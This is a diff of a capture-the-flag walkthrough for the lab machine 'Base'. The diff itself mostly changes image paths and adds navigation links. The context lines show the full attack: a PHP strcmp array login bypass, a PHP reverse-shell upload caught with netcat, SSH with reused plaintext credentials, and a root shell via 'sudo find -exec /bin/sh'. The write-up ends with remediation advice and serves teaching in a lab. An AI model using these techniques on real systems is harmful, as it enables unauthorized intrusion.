@@ -66,7 +66,7 @@ sudo nmap -sVC -A -Pn -T3 $IP
 | `-T3` | Default timing template. `-T4`/`-T5` are faster but noisier and can drop results on unstable links; `-T3` is reliable for a single-target lab. |
 | `sudo` | Required for accurate OS detection and for `-sS`-style SYN behavior on raw sockets. |
 
-![assets/Base/01-nmap-scan.png](assets/Base/01-nmap-scan.png)
+![assets/01-nmap-scan.png](assets/01-nmap-scan.png)
 *Full nmap scan of Base showing SSH on 22 and Apache on 80, with http-title "Welcome to Base"*
 
 **Results:**
@@ -85,7 +85,7 @@ Only two TCP ports. No SSH brute-force surface yet (no credentials), so the web 
 
 Browsing to `http://$IP` shows a marketing site for a **file hosting service**:
 
-![assets/Base/02-landing-page.png](assets/Base/02-landing-page.png)
+![assets/02-landing-page.png](assets/02-landing-page.png)
 *Base landing page — "The World's Number One File Hosting Service" with a Login button*
 
 The navbar offers a **Login** link. Before touching it, enumerate the web root for anything the homepage doesn't advertise.
@@ -111,7 +111,7 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-
 
 Visiting `/login/` is immediately interesting — **Apache directory listing is enabled**, so the index page dumps the folder contents:
 
-![assets/Base/03-login-directory-listing.png](assets/Base/03-login-directory-listing.png)
+![assets/03-login-directory-listing.png](assets/03-login-directory-listing.png)
 *Index of /login — directory listing exposing config.php, login.php and login.php.swp*
 
 Three files:
@@ -144,10 +144,10 @@ vim -r login.php.swp
 
 Either way, the authentication logic of `login.php` comes back:
 
-![assets/Base/05-login-source-1.png](assets/Base/05-login-source-1.png)
+![assets/05-login-source-1.png](assets/05-login-source-1.png)
 *Recovered login.php source — the strcmp() comparison logic visible in the swap file dump*
 
-![assets/Base/04-login-source-2.png](assets/Base/04-login-source-2.png)
+![assets/04-login-source-2.png](assets/04-login-source-2.png)
 *Second half of the recovered login.php source showing header redirect and session assignment*
 
 Reconstructed (line order partially reassembled from the swap buffer — the *logic* is exact):
@@ -219,7 +219,7 @@ if (NULL == 0)   // strcmp returned NULL; we compared with ==
 
 Browse to `http://$IP/login/login.php`, submit **any** dummy values (e.g., `vcxvc` / `xxx`) with the intercept **on** in Burp, so the POST is caught before it leaves the browser. Then rewrite the body to submit both fields as arrays:
 
-![assets/Base/06-burp-auth-bypass.png](assets/Base/06-burp-auth-bypass.png)
+![assets/06-burp-auth-bypass.png](assets/06-burp-auth-bypass.png)
 *Burp Proxy Intercept holding the POST to /login/login.php with the array payload in the body*
 
 The full request:
@@ -244,7 +244,7 @@ username[]=bvc&password[]=cvb
 
 Both guards collapse: `NULL == 0` → `true`, `NULL == 0` → `true`. The server responds **`302 Found`** with `Location: /upload.php` and sets the session as authenticated. Forward the request (or just browse — the session cookie now carries `user_id = 1`).
 
-![assets/Base/07-admin-upload-panel.png](assets/Base/07-admin-upload-panel.png)
+![assets/07-admin-upload-panel.png](assets/07-admin-upload-panel.png)
 *Admin File Uploads panel — authenticated area reached via the bypass*
 
 > [!TIP]
@@ -272,7 +272,7 @@ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
 
 Upload it:
 
-![assets/Base/08-upload-success.png](assets/Base/08-upload-success.png)
+![assets/08-upload-success.png](assets/08-upload-success.png)
 *Green toast confirming "Your file has been uploaded successfully!"*
 
 
@@ -295,7 +295,7 @@ _uploaded               [Status: 200, Size: 509, Words: 25, Lines: 12]
 
 Browsing to `http://$IP/_uploaded/` (directory listing enabled again) confirms `shell.php` is sitting there:
 
-![assets/Base/10-uploaded-directory.png](assets/Base/10-uploaded-directory.png)
+![assets/10-uploaded-directory.png](assets/10-uploaded-directory.png)
 *Index of /_uploaded showing our uploaded shell.php*
 
 ### 4.4 Catching the Shell
@@ -317,7 +317,7 @@ nc -lvnp 8000
 curl http://$IP/_uploaded/shell.php
 ```
 
-![assets/Base/11-reverse-shell.png](assets/Base/11-reverse-shell.png)
+![assets/11-reverse-shell.png](assets/11-reverse-shell.png)
 *Netcat listener catching the reverse shell as www-data on the base host*
 
 ```
@@ -392,7 +392,7 @@ config.php  login.php  login.php.swp
 www-data@base:/var/www/html/login$ cat config.php
 ```
 
-![assets/Base/12-config-credentials.png](assets/Base/12-config-credentials.png)
+![assets/12-config-credentials.png](assets/12-config-credentials.png)
 *cat config.php revealing plaintext credentials admin / thisisagoodpassword*
 
 ```php
@@ -408,7 +408,7 @@ ssh john@$IP
 # password: thisisagoodpassword
 ```
 
-![assets/Base/13-ssh-john-user-flag.png](assets/Base/13-ssh-john-user-flag.png)
+![assets/13-ssh-john-user-flag.png](assets/13-ssh-john-user-flag.png)
 *SSH login as john succeeded — Ubuntu 18.04.6 MOTD and user.txt contents*
 
 ```text
@@ -468,7 +468,7 @@ Reading the sudoers entry: user **john** may run **`/usr/bin/find`** as **user r
 
 Cross-reference on [GTFOBins](https://gtfobins.github.io/gtfobins/find/) (`find` → Shell → Sudo section):
 
-![assets/Base/14-gtfobins-find.png](assets/Base/14-gtfobins-find.png)
+![assets/14-gtfobins-find.png](assets/14-gtfobins-find.png)
 *GTFOBins entry for find — Sudo section with the shell payload*
 
 ### 5.3 Exploitation
@@ -488,7 +488,7 @@ sudo find . -exec /bin/sh \; -quit
 | `-exec /bin/sh \;` | For each match, execute `/bin/sh` **in place of find's normal output**. Because sudo elevates `find` itself, every child process — including this shell — inherits **root**. `\;` terminates the `-exec` expression. |
 | `-quit` | Stop after the first match, so exactly one root shell spawns and `find` exits cleanly (avoids spawning a shell per file). |
 
-![assets/Base/15-root-shell.png](assets/Base/15-root-shell.png)
+![assets/15-root-shell.png](assets/15-root-shell.png)
 *sudo find -exec spawning a root shell and reading root.txt*
 
 ```text
@@ -589,5 +589,15 @@ Layered controls, in order of importance:
 | 5 | RCE | PHP reverse shell upload | No upload validation / no exec restriction |
 | 6 | Pivoting | `ffuf` → `/_uploaded/`, config.php creds, SSH reuse | Plaintext secrets + password reuse |
 | 7 | Privesc | `sudo find . -exec /bin/sh \; -quit` | Interpreter in sudoers |
+
+---
+
+| | |
+|---|---|
+| ← Previous | *Coming soon* |
+| Back to index | [All write-ups](../../../README.md) · [HTB](../../README.md) · [HTB — Easy](../README.md) |
+| Next → | [THM — Support](../../../THM/Medium/Support/README.md) |
+
+---
 
 **End of walkthrough.**
